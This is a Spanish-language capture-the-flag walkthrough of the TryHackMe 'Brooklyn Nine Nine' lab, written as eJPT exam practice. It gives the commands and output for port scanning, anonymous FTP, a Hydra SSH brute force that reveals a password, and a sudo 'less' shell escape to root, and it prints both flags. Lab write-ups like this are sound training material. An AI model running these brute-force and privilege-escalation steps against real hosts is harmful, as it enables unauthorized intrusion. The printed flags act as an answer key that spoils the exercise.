---
title: "Brooklyn Nine Nine"
date: 2026-01-21
draft: false
description: "Walkthrough de Brooklyn Nine Nine de TryHackMe. FTP anónimo con nota que revela usuario, brute force SSH con Hydra y escalada de privilegios con less via GTFOBins — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "hydra",
    "ssh",
    "gtfobins",
    "privesc",
    "less",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 13
---

## Resumen

**Brooklyn Nine Nine** es la decimotercera máquina de la serie _Road to eJPTv2_. Una máquina temática basada en la serie de televisión, con un flujo de ataque clásico: FTP anónimo que expone información de usuarios, brute force SSH con una contraseña débil, y escalada de privilegios usando `less` con permisos sudo — un GTFOBins sencillo pero efectivo.

| Atributo       | Valor                                                                          |
| -------------- | ------------------------------------------------------------------------------ |
| **Plataforma** | TryHackMe                                                                      |
| **Dificultad** | Fácil                                                                          |
| **OS**         | Linux (Ubuntu)                                                                 |
| **Sala**       | [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)              |
| **Skills**     | FTP Enum, SSH Brute Force, GTFOBins (less)                                     |

### Herramientas usadas

- `nmap` — escaneo de puertos y versiones
- `ftp` — acceso anónimo y descarga de archivos
- `hydra` — brute force sobre SSH
- `gobuster` — fuzzing de directorios web
- `ssh` — acceso como jake
- `john` — crackeo de hashes (unshadow)

### Resumen de la solución

1. **Reconocimiento:** nmap detecta FTP con acceso anónimo, SSH y HTTP.
2. **FTP anónimo:** `note_to_jake.txt` revela que `jake` tiene contraseña débil y menciona a los usuarios `amy` y `holt`.
3. **Brute force SSH:** Hydra con rockyou.txt compromete la cuenta de `jake` con `987654321`.
4. **Acceso SSH:** Conectamos como `jake` y enumeramos el sistema.
5. **sudo -l:** `jake` puede ejecutar `less` como root sin contraseña.
6. **PrivEsc:** `sudo less /etc/profile` → `!/bin/sh` → shell de root.
7. **Flags:** User flag en `/home/holt/user.txt`, root flag en `/root/root.txt`.

---

## Reconocimiento

### Ping

Verificamos conectividad e identificamos el SO por el TTL:

```bash
ping -c 1 10.66.170.48
```

```
64 bytes from 10.66.170.48: icmp_seq=1 ttl=62 time=68.9 ms
```

TTL 62 → Linux (el valor original es 64, se decrementó en los saltos de red).

### Nmap — Escaneo de puertos

```bash
nmap 10.201.43.213 -n -Pn -sS -p- --min-rate=5000 -oG allTCPports
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Nmap — Versiones y scripts

```bash
nmap 10.201.43.213 -n -Pn -sS -sVC -p21,22,80 --min-rate=5000 -oN brooklynscan.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Nmap detecta acceso FTP anónimo con un archivo `note_to_jake.txt` visible — pista directa hacia el primer usuario.

---

## Enumeración FTP

### FTP anónimo

```bash
ftp 10.201.43.213 21
Name: anonymous
Password: [vacío]
```

```
ftp> ls
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
ftp> get note_to_jake.txt
```

Contenido de `note_to_jake.txt`:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad
if someone hacks into the nine nine
```

> **Usuarios identificados:** `jake` (contraseña débil), `amy`, `holt`

### Fuzzing web — gobuster

```bash
gobuster dir -u http://10.201.43.213 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

```
/server-status   (Status: 403)
```

Sin directorios accesibles — la superficie web no ofrece vectores de ataque. Nos enfocamos en SSH.

---

## Explotación

### Brute force SSH — Hydra

Con la lista de usuarios (`jake`, `amy`) y la información de que `jake` tiene contraseña débil, lanzamos Hydra contra SSH:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.201.43.213
```

```
[22][ssh] host: 10.201.43.213   login: jake   password: 987654321
```

> **Credenciales:** `jake:987654321`

### Acceso SSH como jake

```bash
ssh jake@10.201.43.213
jake@10.201.43.213's password: 987654321
```

```
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
```

Enumeramos el directorio `/home` — confirmamos los tres usuarios mencionados en la nota:

```bash
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
```

---

## Post-Explotación

### sudo -l

```bash
jake@brookly_nine_nine:~$ sudo -l
```

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`jake` puede ejecutar `less` como root sin contraseña — vector de privesc documentado en GTFOBins.

---

## Escalada de privilegios

### GTFOBins — sudo less

`less` permite ejecutar comandos del sistema mientras está activo. Al abrirlo con `sudo`, cualquier comando que ejecutemos desde dentro corre como root.

```bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
```

Dentro de `less`, escribimos el comando para lanzar una shell:

```
!/bin/sh
```

```
# whoami
root
```

Shell de root obtenida.

### Flags

**User flag** — en el directorio home de `holt`:

```bash
root@brookly_nine_nine:/home/holt# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

> **User flag:** `ee11cbb19052e40b07aac0ca060c23ee`

**Root flag:**

```bash
root@brookly_nine_nine:/root# cat root.txt
63a9f0ea7bb98050796b649e85481845
```

> **Root flag:** `63a9f0ea7bb98050796b649e85481845`

---

## Lecciones aprendidas

- **Las notas internas en servicios públicos son OSINT gratuito** — Un archivo de texto en FTP anónimo reveló usuarios válidos y confirmó que uno tenía contraseña débil. La información operativa nunca debe estar en servicios accesibles públicamente.
- **Contraseñas numéricas simples son triviales con rockyou.txt** — `987654321` aparece en las primeras páginas de cualquier wordlist estándar. Siempre aplicar políticas de contraseñas robustas.
- **`sudo -l` antes de cualquier otra técnica de privesc** — Es el check más rápido y frecuentemente el más productivo. Cualquier binario con `NOPASSWD` en GTFOBins es escalada garantizada.
- **`less` es más peligroso de lo que parece** — Un lector de archivos con `sudo` permite ejecutar comandos arbitrarios. La regla de mínimo privilegio aplica a todos los binarios, no solo a los obvios.

### Para la eJPT

| Concepto                        | Relevancia eJPT                                         |
| ------------------------------- | ------------------------------------------------------- |
| FTP anónimo + análisis de archivos | Enumeración de servicios de red core del examen      |
| SSH brute force con Hydra        | Técnica de acceso estándar en el syllabus               |
| sudo + GTFOBins (less)           | Privesc sin exploits de kernel — muy frecuente          |

**Tiempo aproximado de resolución:** 20-30 minutos.

---

## Referencias

- [Brooklyn Nine Nine — TryHackMe](https://tryhackme.com/room/brooklynninenine)
- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
